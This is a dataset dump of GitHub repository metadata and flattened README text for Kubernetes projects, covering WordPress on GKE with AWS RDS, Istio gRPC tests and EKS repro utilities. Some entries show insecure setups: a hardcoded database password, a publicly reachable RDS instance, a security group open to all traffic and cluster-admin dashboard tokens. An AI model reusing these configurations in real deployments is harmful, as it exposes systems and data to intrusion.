taisho6339,k8s-networking-deep-dive,,,2020-11-01T02:43:38Z,2020-11-02T12:19:53Z,Shell,User,1,1,0,5,master,taisho6339,1,0,0,0,0,0,0
thevishnuhimself,Wordpress-on-K8s-Using-GCP,,Wordpress on K8s Using GCP Description I deployed the WordPress application on Kubernetes and AWS using terraform including the following steps I wrote an infrastructure as code using Terraform which automatically deploys the WordPress application On AWS I used RDS service for the relational database for the WordPress application Then deployed WordPress as a container either on top of Minikube or EKS or Fargate service on AWS The WordPress application is accessible from the public world which deployed on AWS I have used the GKE service for installing Wordpress on Kubernetes I have used the concept of modules in Terraform for writing code in a more efficient and managed way Prerequisites for making this task 1 GCP Account 2 AWS Account 3 Terraform 4 Kubectl command installed 5 AWS CLI 6 Gcloud SDK installed 7 AWS IAM User 8 GCP credentials 9 Text Editor Now I am showing first the main and variables files of Terraform In this file we have modules and provider for GCP and AWS too main tf provider google credentials file var gcpcredentialspath project var gcpprojectid region var gcpcurregion provider aws profile var awsprofile region var awsregion module gcpaws source modules gcpprojectid var gcpprojectid gcpvpcname var gcpvpcname subnetgcpname var subnetgcpname subnetipcidrrange var subnetipcidrrange gcpsubnetregion var gcpsubnetregion gcpcomputefirewall var gcpcomputefirewall allowedports var allowedports googlecontainerclustername var googlecontainerclustername googlecontainerclusterlocation var googlecontainerclusterlocation gcpnodeconfigmachinetype var gcpnodeconfigmachinetype awsdbinstancestoragetype var awsdbinstancestoragetype awsdbinstanceengine var awsdbinstanceengine awsdbinstanceengineversion var awsdbinstanceengineversion awsdbinstanceinstanceclass var awsdbinstanceinstanceclass awsdbinstancedbname var awsdbinstancedbname awsdbinstanceusername var awsdbinstanceusername awsdbinstancepassword var awsdbinstancepassword awsdbinstancepubliclyaccessible var awsdbinstancepubliclyaccessible awsdbinstanceskipfinalsnapshot var awsdbinstanceskipfinalsnapshot vars tf variable gcpcredentialspath default C UsersThis pcAppDataRoaminggcloudapplicationdefaultcredentials json variable gcpprojectid default durable melody 289019 variable gcpcurregion default asia south1 variable awsprofile default GCPuser variable awsregion default ap south 1 variable gcpvpcname default gcp vpc variable subnetgcpname default subnet vpc variable subnetipcidrrange default 10 0 2 0 24 variable gcpsubnetregion default asia southeast1 variable gcpcomputefirewall default firewall gcp variable allowedports type list default 80 22 variable googlecontainerclustername default gcp cluster variable googlecontainerclusterlocation default asia southeast1 variable gcpnodeconfigmachinetype default n1 standard 1 variable awsdbinstancestoragetype default gp2 variable awsdbinstanceengine default mysql variable awsdbinstanceengineversion default 5 7 variable awsdbinstanceinstanceclass default db t2 micro variable awsdbinstancedbname default db variable awsdbinstanceusername default admin variable awsdbinstancepassword default thevishnuhimself variable awsdbinstancepubliclyaccessible default true variable awsdbinstanceskipfinalsnapshot default true Now the modules folder where the code of each service is present in the form of Terraform gcpvpc tf variable gcpvpcname variable subnetgcpname variable subnetipcidrrange variable gcpsubnetregion variable gcpcomputefirewall variable allowedports variable gcpprojectid Creating a VPC resource googlecomputenetwork vpcgcp name var gcpvpcname autocreatesubnetworks false project var gcpprojectid Creating a subnetwork resource googlecomputesubnetwork subnetvpc dependson googlecomputenetwork vpcgcp name var subnetgcpname ipcidrrange var subnetipcidrrange region var gcpsubnetregion network googlecomputenetwork vpcgcp id Creating a firewall resource googlecomputefirewall default dependson googlecomputenetwork vpcgcp name var gcpcomputefirewall network googlecomputenetwork vpcgcp name allow protocol icmp allow protocol tcp ports var allowedports gcpgke tf variable googlecontainerclustername variable googlecontainerclusterlocation variable gcpnodeconfigmachinetype resource googlecontainercluster gcpcluster dependson googlecomputenetwork vpcgcp name var googlecontainerclustername location var googlecontainerclusterlocation initialnodecount 1 masterauth username password clientcertificateconfig issueclientcertificate false nodeconfig machinetype n1 standard 1 network googlecomputenetwork vpcgcp name project var gcpprojectid subnetwork googlecomputesubnetwork subnetvpc name running the command to update the kubeconfig file resource nullresource cluster provisioner local exec command gcloud container clusters get credentials googlecontainercluster gcpcluster name region googlecontainercluster gcpcluster location project googlecontainercluster gcpcluster project K8sCluster tf provider kubernetes configcontextcluster gke googlecontainercluster gcpcluster project googlecontainercluster gcpcluster location googlecontainercluster gcpcluster name resource kubernetesservice k8s dependson awsdbinstance wpdb googlecontainercluster gcpcluster metadata name wp labels env test name wp spec type LoadBalancer selector app wp port port 80 targetport 80 output ipadd value kubernetesservice k8s loadbalanceringress 0 ip resource kubernetesdeployment wpdeploy dependson awsdbinstance wpdb googlecontainercluster gcpcluster metadata name wp deploy labels name wp deploy app wp spec replicas 1 selector matchlabels app wp template metadata name wp deploy labels app wp spec container name wp image wordpress env name WORDPRESSDBHOST value awsdbinstance wpdb address env name WORDPRESSDBUSER value awsdbinstance wpdb username env name WORDPRESSDBPASSWORD value awsdbinstance wpdb password env name WORDPRESSDBNAME value awsdbinstance wpdb name open wordpress site on browser resource nullresource openwordpress provisioner local exec command start chrome kubernetesservice k8s loadbalanceringress 0 ip awsrds tf variable awsdbinstancestoragetype variable awsdbinstanceengine variable awsdbinstanceengineversion variable awsdbinstanceinstanceclass variable awsdbinstancedbname variable awsdbinstanceusername variable awsdbinstancepassword variable awsdbinstancepubliclyaccessible variable awsdbinstanceskipfinalsnapshot resource awsvpc defaultvpc cidrblock 192 168 0 0 16 instancetenancy default enablednshostnames true tags Name vishnuvpc resource awssubnet vishnupublicsubnet vpcid awsvpc defaultvpc id cidrblock 192 168 0 0 24 availabilityzone ap south 1a mappubliciponlaunch true tags Name vishnupublicsubnet resource awssubnet vishnupublicsubnet2 vpcid awsvpc defaultvpc id cidrblock 192 168 1 0 24 availabilityzone ap south 1b mappubliciponlaunch true tags Name vishnupublicsubnet2 resource awsdbsubnetgroup default name main subnetids awssubnet vishnupublicsubnet id awssubnet vishnupublicsubnet2 id tags Name My DB subnet group resource awsinternetgateway vishnugw vpcid awsvpc defaultvpc id tags Name vishnugw resource awssecuritygroup vishnupublicsg dependson googlecontainercluster gcpcluster name HTTPSSHPING description It allows HTTP SSH PING inbound traffic vpcid awsvpc defaultvpc id ingress description TLS from VPC fromport 0 toport 0 protocol 1 cidrblocks 0 0 0 0 0 ipv6cidrblocks 0 egress fromport 0 toport 0 protocol 1 cidrblocks 0 0 0 0 0 ipv6cidrblocks 0 tags Name HTTPSSHPING resource awsdbinstance wpdb dependson awssecuritygroup vishnupublicsg allocatedstorage 20 storagetype var awsdbinstancestoragetype engine var awsdbinstanceengine engineversion var awsdbinstanceengineversion instanceclass var awsdbinstanceinstanceclass name var awsdbinstancedbname username var awsdbinstanceusername password var awsdbinstancepassword parametergroupname default mysql5 7 publiclyaccessible var awsdbinstancepubliclyaccessible skipfinalsnapshot var awsdbinstanceskipfinalsnapshot vpcsecuritygroupids awssecuritygroup vishnupublicsg id dbsubnetgroupname awsdbsubnetgroup default name Now initialize the Terrafrom code by running terrafrom init command images init png Then for the execution of the code run the terraform apply command images 3process png Now after running the command apply we have to enable the Compute Engine API in GCP images api enable png The cluster in GCP images cluster png Finally to check the Cluster info we have to check the kubectl in command shell by running kubectl cluster info images kubectl png You can see in this image that Kubernetes master is running Now to check the nodes that whether they successfully created or not we have to run kubectl get nodes o wide in the command shell images nodes png Load Balancing images lb png The Database in AWS images db png Kudos our wordpress is launched now images wordpress png images login png Here I made a webpage with the help of wordpress images webpage png Thanks for your time to read Always welcome your feedback,2020-09-13T17:48:49Z,2020-10-18T19:46:33Z,n/a,User,1,1,0,15,master,thevishnuhimself,1,0,0,0,0,0,0
clequinio5,aws-k8s-react-app,,Deployment of a create react app application in AWS through a Jenkins pipeline using Docker and Kubernetes Stack Software NodeJS ReactJS Webpack Babel CI CD Github Jenkins AWS cli eksctl Docker Kubernetes Overview Overview assets aws k8s react app png Deployment Create a new IAM profile for the deployment on AWS Create an Ubuntu 20 04 Server t2 medium EC2 instance SSH into it and install Jenkins eksctl kubectl docker awscli Configure Jenkins with aws credentials docker credentials github credentials the requires plugins to run pipeline like pipeline aws and create a new pipeline that pull your github repo and use the Jenkinsfile inside it to deploy your react app Run your pipeline Browser the External Ip of k8s loadBalancer given in the logs of the pipeline Make sure to reload your browser whithout cache Ctrl F5 after a change in the app,2020-12-04T00:55:32Z,2020-12-05T15:18:40Z,JavaScript,User,1,1,0,52,main,clequinio5,1,0,0,0,0,0,0
twistlock,k8s-cve-2020-8554-mitigations,,Prisma Cloud Compute Mitigations for Kubernetes CVE 2020 8554 This repository contains Prisma Cloud Compute Admission rules that mitigate exploitation of CVE 2020 8554 an unpatched Kubernetes vulnerability To ensure correct usage please follow the instructions provided in the Prisma Cloud Mitigation section of our response post Protecting Against Kubernetes CVE 2020 8554 https unit42 paloaltonetworks com Kubernetes CVE 2020 8554 Kubernetes CVE 2020 8554 is a design flaw allowing services to intercept cluster traffic to certain IPs by setting their spec exteralIPs or status loadBalancer ingress ip fields to those IPs Non admin users that can create or update services or patch services status can exploit the vulnerability to perform Man in The Middle https attack mitre org techniques T1557 attacks against pods and nodes in the cluster in an attempt to escalate their privileges Further Reading For more information refer to Protecting Against Kubernetes CVE 2020 8554 https unit42 paloaltonetworks com,2020-12-20T04:22:43Z,2020-12-22T16:04:03Z,n/a,Organization,5,1,0,7,main,YuvalAvra,1,0,0,0,0,0,0
ewerton-silva00,study-k8s-with-kind,,Estudo de Kubernetes com Kind O Kind https kind sigs k8s io Kubernetes in Docker uma forma fcil e leve de executar o Kubernetes num ambiente local para testes e aprendizado mas n o recomendado para uso em produ o O Kind foi inclusive desenvolvido para testar o prprio Kubernetes Contedo 01 Instala o e configura o do Kind content kind README md 02 LoadBalancer com MetalLB content metallb README md 03 Metrics Server content metrics server README md 04 Kubernetes Dashboard content dashboard README md 05 Nginx Ingress Controller content nginx ingress controller README md,2020-09-14T00:56:16Z,2020-12-10T13:13:50Z,n/a,User,1,1,0,13,master,ewerton-silva00,1,0,0,0,0,0,0
wcdi,is13-k8s-manifest,,,2020-10-03T06:02:04Z,2020-10-05T05:33:44Z,n/a,Organization,4,1,0,14,master,gamoutatsumi,1,0,0,0,0,0,0
Hzaakk,K8sJupyterMultiArch,docker#jupyter#jupyter-lab#kubernetes#multi-platform#nfs,K8sJupyterMultiArch Dynamic provisioning of Jupyter Lab containers for a multi architecture x86 and ARM Kubernetes cluster Users choose the architecture to run on Note change the keys in initialmanifests secret yaml if you want actual security Architecture is shown below architecture jupyterapparchitecture png,2020-10-19T15:05:09Z,2020-11-10T10:58:30Z,Shell,User,1,1,0,22,main,Hzaakk,1,0,0,0,0,0,0
ronak-agarwal,mongo-enterprise-k8s-gssapi,,Options to deploy Mongo enterprise cluster with kerberos 1 Single pod deployment where it run 7 sidecar containers without ops manager this is good for short lived ephemeral environment and for dev test 2 HA setup This will deploy opsmgr backed by 3 replicas of appdb cluster and 3 config 3 shard replicas 1 shard 1 mongos Detailed steps are covered seperately in respective directory,2020-10-29T20:51:17Z,2020-12-03T17:26:00Z,Dockerfile,User,1,1,0,0,master,,0,0,0,0,0,0,0
cheng0214,k8s-prometheus-adapter-tutorial,,https github com DirectXMan12 k8s prometheus adapter blob master docs walkthrough md k8s prometheus adaptertoturial k8s prometheus operatork8sprometheus grafanasample appNode js appk8s prometheus adapterk8sprometheus metrics serverk8s native metrics server VS k8s prometheus adapter apimetrics server apis metrics k8s io v1beta1 k8s prometheus adapter apis custom metrics k8s io apis external metrics k8s io metrics serverpodnode kubectl top nodes kubectl top pods HPAcpumem k8s prometheus adapter HPA v2beta1 k8sHPAHPAHPA podcpumem 1 prometheus servicemonitor sample app sample app service monitor yaml Note prometheus 2 prometheus 3 k8s prometheus adapter https github com DirectXMan12 k8s prometheus adapter blob master docs config walkthrough md 4 HPA yaml sample app sample app hpa custom metrics yaml 1 kubectl create f prometheus operator prometheus operator prometheusalertmanager 2 kubectl create f metrics server yaml metrics server 3 k8s prometheus adapter k8s prometheus adapter README md 4 kubectl create f sample app sample app 5 kubectl create f grafana grafana absample appsample app grafana grafanaadmin docker for desktop MacIssue,2020-11-02T08:53:18Z,2020-11-12T07:31:12Z,Shell,User,1,1,0,7,main,cheng0214,1,0,0,0,0,0,0
sd3428783,spark-on-k8s-image,,,2020-10-26T06:52:53Z,2020-10-26T08:12:47Z,Dockerfile,User,1,1,0,4,main,sd3428783,1,0,0,0,0,0,0
Takoa,playbooks-for-k8s-cluster,,Ansible Playbooks for Setting Up a Kubernetes Cluster Ansible playbooks for setting up a stacked highly availabile Kubernetes cluster with Docker and kubeadm How to Use Execute playbooks commands in the following order If you already have ansible user set up skip Step 0 Note that users and directories specified in the playbooks mostly assume default settings of Ubuntu 20 04 on Raspberry Pi 4B 0 ansible playbook add ansible user yml ssh common args o StrictHostKeyChecking accept new 1 ansible playbook install docker yml 2 ansible playbook install kubeadm yml 3 ansible playbook setup master yml 4 Copy kubeadm join commands in kubeadm init out to join nodes yml 5 ansible playbook join nodes yml 6 ansible playbook change cgroup driver yml,2020-08-23T11:41:51Z,2020-08-25T05:55:27Z,n/a,User,1,1,0,5,master,Takoa,1,0,0,0,0,0,0
mgorav,k8s-caching-as-service,,Kubernetes Based Caching As Service Powered by Hazelcast Steps Create Role Based Access Control bash kubectl apply f operator rbac yaml NOTE to add cluster permission bash kubectl apply f hazelcast rbac yaml Create Custom Resource Definition bash kubectl apply f hazelcast cluster crd yaml Hazelcast operator deployment bash kubectl validate false apply f hazelcast operator yaml Finally start Hazelcast cluster as sidecar bash kubectl apply f hazelcast yaml Deployment Patterns SideCar K8s SideCar k8s cas png,2020-10-11T19:35:28Z,2020-10-12T21:03:38Z,n/a,User,1,1,0,2,main,mgorav,1,0,0,0,0,0,0
felipearaujos,k8s-study-health-check-api,,k8s study health check api Just some samples to create a dockerfile and healthcheck plug Docker docker build t felipearaujos health check no cache docker run d name health check api p 4000 4000 felipearaujos health check docker push felipearaujos health check latest Minikube minikube start minikube kubectl get pods minikube addons enable ingress minikube dashboard Kubect kubectl cluster inf kubectl config use context minikube kubectl logs pod name Helm helm create buildachart ls buildachart helm install my cherry chart buildachart values buildachart values yaml helm uninstall my cherry helm upgrade buildachart values buildachart values yaml What is this API A simple elixir image to be used as application to deploy araujo org chart helm chart to facilitate k8s depoloyment Helm is a package manager for Kubernetes k8s running locally using minikube docker hub when the API image is published Steps Pack api in a image Publish to docker hub Create helm chart Configs and image repo Deploy to running k8s on minukube using helm install,2020-11-22T19:12:23Z,2020-11-27T23:06:15Z,Elixir,User,1,1,0,20,main,felipearaujos,1,0,0,0,0,0,0
Sameerkash,Understanding-Docker-and-k8s,devops#docker#docker-compose#docker-image#kubernetes#kubernetes-cluster#kubernetes-deployment,Understanding Kubernetes This is a documentation of my learning process of Kubernentes Architecture Contanirization Orchestration and probably the entire DevOps process Check List x Kubernetes Setup using Docker Desktop x Setup WaveScope and Kubernetes DashBoard Deploying stacks to Kuberentes Managing and monitoring Pods Chaos Testing Setup The setup process might be a bit tedious especially if you google something and refer the official documentation https kubernetes io blog 2020 05 21 wsl docker kubernetes on the windows desktop There is very little instruction on how to install Kubernetes out there The documentation in specific goes about installing using WSL https docs microsoft com en us windows wsl install win10 and MiniKube but the problem is it is a bit complicated for a beginner and can easily get stuck as did I Until my friend pointed out that Docker Desktop comes with Kubernetes pre installed and all we have to do it enable it So that took me a few minutes compared to spending an entire day following the official documentation So yeah Go to settings Kubernetes and click on enable Kubernetes and you are done1 pretty much Well Almost We ll also have to install the Kubernetes Dashboard for managing our Nodes and Pods and also an optional tool called WaveScope for managing our pods Kubernetes Dashboard The Dashboard UI needs to be installed using a config file apply the config file bash kubectl apply f kubedashboard yaml generate an admin account and get the token bash kubectl create serviceaccount krishiadmin n default kubectl create clusterrolebinding krishi admin n default clusterrole cluster admin serviceaccount default krishiadmin kubectl get secret kubectl get serviceaccount krishiadmin o jsonpath secrets 0 name o jsonpath data token base64 decode If you are on Windows Powershell You might want to use this to obtain the base64 decoded JWT PS iconv f ASCII t UTF 16LE filename txt base64 w 0 where filename txt contains the base64 encoded JWT run the proxy bash kubectl proxy navigate to http localhost 8001 api v1 namespaces kubernetes dashboard services https kubernetes dashboard proxy and enter the token to stop the dashboard bash kubectl delete f kubedashboard yaml WaveScope bash kubectl apply f scope yaml expose port 4040 to localhost bash kubectl port forward n weave kubectl get n weave pod selector weave scope component app o jsonpath items metadata name 4040 open http localhost 4040 Special Thanks to Satyajit https github com satyajitghana for helping me get started,2020-09-15T16:39:38Z,2020-11-02T07:29:42Z,n/a,User,1,1,0,5,master,Sameerkash,1,0,0,0,0,0,0
scalasm,aws-k8s-spring-boot-archetype,,Spring Boot Maven Archetype for Microservices This project is an archetype for scaffolding new microservice projects based on Spring Boot https spring io projects spring boot stack It leverages several tools that I find useful in my usual workflow Skaffold https skaffold dev 0 15 0 or better Kustomize included in Kubectl 1 14 x or newer Maven 3 6 x Jib https github com GoogleContainerTools jib 2 6 x A Kubernetes environment either running locally on your machine like Docker for Desktop https hub docker com editions community docker ce desktop windows or Minikube https github com kubernetes minikube or remotely on some actual server machines like AWS EKS With this you will get a very basic RESTful endpoint with Spring Boot Web and Kubernetes readiness liveness checks configured nothing more but at least you can start tweaking things I find it useful when starting my services from scratch without copying and pasting things around across projects Note that this archetype has been created from Hello World project repository https github com scalasm aws k8s hello world you may want to take a look at it for more info about the stack and tools that I ve used How to use 1 Clone this repository locally and launch the usual mvn clean install so that you may use it on your machine 2 In a terminal or your IDE run something like the following of course adapt the command line shell script mvn archetype generate DarchetypeGroupId me marioscalas archetypes DarchetypeArtifactId aws k8s spring boot archetype DarchetypeVersion 0 0 1 SNAPSHOT DgroupId me marioscalas sample DartifactId cool sample microservice Dversion 0 0 1 SNAPSHOT 3 Build and run the microservice Ensure you have your cluster available and run skaffold skaffold run Note you can define custom profiles with Skaffold and define the Docker image repository to use see Skaffold documentation for that For example on my laptop and using Docker for Desktop INFO INFO Containerizing application to Docker daemon as cool sample microservice WARNING Base image gcr io distroless java 11 does not use a specific image digest build may not be reproducible INFO Getting manifest for base image gcr io distroless java 11 INFO Building dependencies layer INFO Building resources layer INFO Building classes layer INFO Using base image with digest sha256 28ec552405a92ed1a3767b81aaece5c48bd1b89dfb5f3c144b0e4cea4dd5ffa4 INFO INFO Container entrypoint set to java cp app resources app classes app libs me marioscalas sample HelloWorldApplication INFO Loading to Docker daemon INFO INFO Built image to Docker daemon as cool sample microservice INFO INFO INFO BUILD SUCCESS INFO INFO Total time 9 488 s INFO Finished at 2020 10 18T22 22 59 02 00 INFO WARNING The requested profile personal could not be activated because it does not exist Tags used in deployment cool sample microservice cool sample microservice d91470fb45dc4b6e03e7f6602a5c6996b08fd1288074f76ed41a78c29be0f63f Starting deploy configmap cool sample microservice cm created service cool sample microservice svc created deployment apps cool sample microservice created Waiting for deployments to stabilize deployment cool sample microservice waiting for rollout to finish 0 of 1 updated replicas are available deployment cool sample microservice is ready Deployments stabilized in 24 7458471s You can also run skaffold run tail to get the logs You can check that the microservice is up and running using Kubectl PS C srcmedium articlescicd kubernetes awscool sample microservice kubectl get pods NAME READY STATUS RESTARTS AGE cool sample microservice 57668bd97f 4qmgt 1 1 Running 0 30s PS C srcmedium articlescicd kubernetes awscool sample microservice kubectl logs cool sample microservice 57668bd97f 4qmgt f Using Spring Boot 2 3 4 RELEASE 20 23 02 638 restartedMain INFO me marioscalas sample HelloWorldApplication Starting HelloWorldApplication on cool sample microservice 57668bd97f 4qmgt with PID 1 app classes started by nobody in 20 23 02 640 restartedMain DEBUG me marioscalas sample HelloWorldApplication Running with Spring Boot v2 3 4 RELEASE Spring v5 2 9 RELEASE 20 23 02 640 restartedMain INFO me marioscalas sample HelloWorldApplication The following profiles are active default 20 23 04 600 restartedMain INFO me marioscalas sample HelloWorldApplication Started HelloWorldApplication in 2 488 seconds JVM running for 3 162,2020-10-18T18:32:12Z,2020-12-19T18:50:56Z,Java,User,1,1,0,3,master,scalasm,1,0,0,0,0,0,0
simple-starters,generator-boot-k8s-kustomize-skaffold,,Generator for Kubernetes resources using Kustomize and Skaffold This generator creates the resources to deploy a Spring Boot application and a MySQL Database You will need to install the following command line tools kubectl https kubernetes io docs tasks tools install kubectl kustomize https kubernetes sigs github io kustomize installation skaffold https skaffold dev docs install If you want to use Helm to deploy services install it s CLI helm v3 cli https github com helm helm releases tag v3 3 1 If you used the starter service then the generator has already been executed and you can immediately deploy the application s required services and then build and deploy the application Deploy required services If your application needs services such as a Database or Message Queue this section shows you how to deploy these services to Kubernetes For MySQL you have two deployment options pick one Option 1 MySQL using simple deployment service YAML Step 1 Create a secret kubectl create secret generic mysql from literal mysql root password echo RANDOM from literal mysql password echo RANDOM Step 2 Deploy the service skaffold run p local services Deleting bash skaffold delete p local services Option 2 MySQL using Helm You should have Helm v3 installed Step 1 Add the Bitnami Helm chart repository to your installation bash helm repo add bitnami https charts bitnami com bitnami Step 2 Create the service release bash skaffold run p local services helm Deleting To delete the service release bash skaffold delete p local services helm Building and deploying the application This generator relies on the Jib Maven Plugin https github com GoogleContainerTools jib tree master jib maven plugin If you are using Minikube you should configure your terminal to use the same Docker environment bash eval minikube docker env Step 1 Build the project create the container image and deploy to Kubernetes bash skaffold run p local Use kubectl get all to verify that the resources created Accessing the application s endpoint varies based on the type of Kubernetes cluster you are using For example if minikube is being used look for the endpoint to access using the command minikube service list As you make changes to the application execute the skaffold run p local command to rebuild the container and update the application running in the Kubernetes cluster Deleting bash skaffold delete p local Generator Commands The Tanzu Starter Service can run these generator commands on the server when creating a new project Alternatively you can run the generator command using the Tanzu Starter Service CLI named tss TODO LINK TO DOWNLOAD CLIENT k8s new creates A skaffold yaml file in the root directory A kustomize directory structure with an overlay named local The kustomize file is located in kubernetes overlays local kustomization yaml Adds the Jib Maven Plugin https github com GoogleContainerTools jib tree master jib maven plugin to the Maven pom xml under the profile local Adds an Spring Actuator dependency to the Maven pom xml if it is not already present k8s update creates A kustomize directory structure with overlays named local services and local services helm for MySql if the project has a dependency on the mysql connector java library Running the application and services Once the generator commands have be executed you can run the application and services,2020-09-23T21:34:26Z,2020-09-24T02:09:27Z,n/a,Organization,3,1,0,2,master,markpollack,1,0,1,0,0,0,0
237summit,Getting-Started-with-K8s,,,2020-09-09T10:39:08Z,2020-12-01T12:59:09Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
WoodProgrammer,aws-secrets-k8s-controller,,CloudSecret Controller Build Status https travis ci org WoodProgrammer aws secrets k8s controller svg branch master https travis ci org WoodProgrammer aws secrets k8s controller AWS SSM Controller helps to us mirror the parameter store components to Kubernetes Secrets You can easily get your secrets and create your kubernetes secrets as a file or environment variables Usage This is an example manifest file you can get parameters starting with prefix and it create as a file or env there is two option Another required parameter is secretname that is the name of the kubernetes secrete name which will create mountfilename is required parameter for the secrets which is needs to create via file It creating secret file with the name mountfilename yaml apiVersion woodprogrammer io v1 kind CloudSecret metadata name staging secrets file namespace default spec type file prefix dev secretname staging secrets file mountfilename config yaml namespace default Build Installation First Step Create CRD shown below kubectl apply f crd cloudsecret yaml Second Step Deploy the controller kubectl apply f k8s If you are working with aws located clusters you should give access to nodes for ssm Verbs If you are using kiam kube2iam or aws iam authenticator you should setup your policy access to namespace or pods Project overview TODO Immutable Secrets AWS AccessKeys SecretKeys to run controller on other cloud providers,2020-10-01T17:48:02Z,2020-10-05T22:34:19Z,Python,User,1,1,0,21,master,WoodProgrammer#UtkucanBykl,2,0,0,0,0,0,6
DonghunLouisLee,k8s_Istio_grpc_stateful_example,,Introduction This repo is to test the compatibility of k8s grpc istio cassandra k8s grpc combination have following know problems https kubernetes io blog 2018 11 07 grpc load balancing on kubernetes without tears This repo is to test these problems and find ways to go around it Spec Client grpc client with five fake Users sending messages to the server Server grpc server Fluentd has been added for monitoring logging Steps to test k8s grpc built in LoadBalancer 0 Optional configure the namespace kubectl config set context current namespace poc 1 build docker images for client and server make docker build server make docker build client 2 Then create a namespace for poc kubectl apply f namespace yaml 3 Then create a service kubectl apply f services yaml 4 Then deploy the images kubectl apply f server deployment yaml kubectl apply f client deployment yaml 5 Then check if everything s running by looking at logs for each server pods kubectl logs l name poc server Steps to test k8s grpc Istio 0 Restart the minikube with enough cpus and memories I used cpus 4 and memory 16384 This is needed because istio do take up good amount of computing power 1 Install istio on local minikube Look below for some details https istio io v1 4 docs setup getting started Latest version might not work I haven t tested it since there are some syntax changes and stuff 2 Then create a namespace for poc kubectl apply f namespace yaml 3 Then allow istio injection kubectl label namespace poc istio injection enabled Then check if it worked by kubectl label namespace poc istio injection enabled poc should have label istio injection enabled 4 Then deploy the server kubectl apply f istio server deployment yaml 5 Then deploy the client kubectl apply f client deployment yaml 8 Then check the status minikube dashboard 9 All the pods should have two containers one for the actual app and the other for envoy proxy 10 Optional For more configuration you are free to run following files istio ilbgateway yaml istio virtualservice yaml These won t do anything for now though Useful libraries Miscellaneous ideas Istio https bcho tistory com 1293 category 731548 https bcho tistory com 1295 category 731548 https www youtube com watch v 1iyFq2VaL5Y https crates io crates avro rs https kubernetes io docs concepts services networking service Istio mesh microservices GUI tool 1 https kiali io 2 https github com kiali kiali Instead of making LB do the work we could use grpc connetion pool from the client side make rust library in the future 1 Grpc connection pool https github com processout grpc go pool blob master pool go Database connection pool 1 https github com sfackler r2d2 Istio example 1 https github com GoogleCloudPlatform istio samples tree master sample apps grpc greeter go manifests https www cncf io projects https github com tikv tikv Things to check for stability FCAPS 1 Fault management Things to remember for production 1 check k8s and istio version compatibility 2 install istio on aks all the versioning issues set versions for all stacks 1 es 2 rust nightly 3 rust 4 k8s don t use 1 19 version stay with 1 16 1 as it s the minimum for istio 5 fluentd 6 istio Istio setup useful commands 1 For istioctl export PATH PWD bin PATH,2020-09-08T11:07:48Z,2020-09-21T10:46:43Z,Rust,User,2,1,0,11,master,DonghunLouisLee,1,0,0,0,0,0,0
mmerkes,eks-k8s-repro-assistant,,eks k8s repro assistant A set of utilities and instructions for reproducing and testing Kubernetes issues NOTE The below scenarios and utilities may or may not have been successfully used to reproduce issues so you should review the code and configuration accordingly and adjust if it s not meeting your needs Setting up a cluster Set environment variables to be used across commands export CLUSTERNAME cluster 1 17 export K8SVERSION 1 17 export REGION us east 2 export SSHKEY k8stest export NODEGROUPNAME test export ACCOUNTID 111122223333 Create an EKS cluster with eksctl eksctl create cluster name CLUSTERNAME version K8SVERSION region REGION nodegroup name NODEGROUPNAME nodes 1 nodes min 1 nodes max 1 ssh access ssh public key SSHKEY Set up Prometheus monitoring This is a shortening of the EKS docs to set up Prometheus https docs aws amazon com eks latest userguide prometheus html Go to the docs if this gets out of date kubectl create namespace prometheus helm install kube prometheus stable prometheus namespace prometheus set alertmanager persistentVolume storageClass gp2 server persistentVolume storageClass gp2 Verify that pods are ready kubectl get pods n prometheus Port forward console to local machine kubectl namespace prometheus port forward deploy kube prometheus server 9090 Go to localhost 9090 to verify the install Set up Grafana to view Prometheus metrics You need Grafana installed on your laptop for this to work https grafana com grafana download platform mac but you can use Grafana to dashboard Prometheus metrics On a Mac brew update brew install grafana Start grafana service brew services start grafana Stop grafana service brew services stop grafana The below is a condensing of these instructions https prometheus io docs visualization grafana 1 Go to localhost 3000 2 Login with admin admin 3 Change your password 4 Click Add data source 5 Select Prometheus 6 Set URL to http localhost 9090 No other settings need to be set 7 Click Save and test 8 Now you can create dashboards in Grafana using Prometheus queries Set up metrics server and Kubernetes dashboard kubectl apply f https github com kubernetes sigs metrics server releases download v0 3 7 components yaml Wait for pods to be running kubectl get deployments all namespaces grep metrics server Verify it s working kubectl top node Install kubernetes dashboard kubectl apply f https raw githubusercontent com kubernetes dashboard v2 0 4 aio deploy recommended yaml kubectl apply f setup dashboard yaml kubectl n kubernetes dashboard describe secret kubectl n kubernetes dashboard get secret grep admin user awk print 1 Start a proxy to display dashboard kubectl proxy You can view the dashboard at http localhost 8001 api v1 namespaces kubernetes dashboard services https kubernetes dashboard proxy You ll need to set up authentication If it s just a dev cluster and you don t have significant security considerations you can use an existing token set up for a service account Get the names of your secrets k get secrets Get the token and paste it in the console k describe secret default token 2jjt2 grep token Set up ALB Ingress Controller This is a shortening of the EKS docs on how to set up the ALB ingress controller https docs aws amazon com eks latest userguide alb ingress html eksctl utils associate iam oidc provider region REGION cluster CLUSTERNAME approve curl o iam policy json https raw githubusercontent com kubernetes sigs aws alb ingress controller v1 1 8 docs examples iam policy json aws iam create policy policy name ALBIngressControllerIAMPolicy policy document file iam policy json kubectl apply f https raw githubusercontent com kubernetes sigs aws alb ingress controller v1 1 8 docs examples rbac role yaml eksctl create iamserviceaccount region REGION name alb ingress controller namespace kube system cluster CLUSTERNAME attach policy arn arn aws iam ACCOUNTID policy ALBIngressControllerIAMPolicy override existing serviceaccounts approve kubectl apply f https raw githubusercontent com kubernetes sigs aws alb ingress controller v1 1 8 docs examples alb ingress controller yaml Edit the controller deployment kubectl edit deployment apps alb ingress controller n kube system Add the arguments below with your values spec containers args ingress class alb cluster name aws vpc id aws region Confirm that the controller is running kubectl get pods n kube system grep alb ingress controller Setup Scenarios Scenario 1 Deployment using ALB ingress controller with ReadinessGate This sets up a service ingress and deployment with a readiness gate that utilizes the ALB ingress controller See scenarios alb ingress with readinessgate README md for more details Utilities Utility 1 Load balancer traffic generator This sets up a deployment with pods that continually curl a configured endpoint to generate traffic You can scale the deployment to increase the amount of traffic hitting your endpoint See utilities lb traffic generator README md for more details Utility 2 Disk IO generator This creates a deployment that constantly reads and writes from disk intended to create IO pressure See utilities disk io generator README md for more details Utility Scripts The utilities scripts directory is intended for scripts you run ad hoc on your development machine Useful Prometheus Queries View nodes by ready status You can add the following to a Grafana dashboard to see the status of the different nodes and differentiate between ready not ready and unknown sum kubenodestatusconditioncondition Ready status true sum kubenodestatusconditioncondition Ready status false sum kubenodestatusconditioncondition Ready status 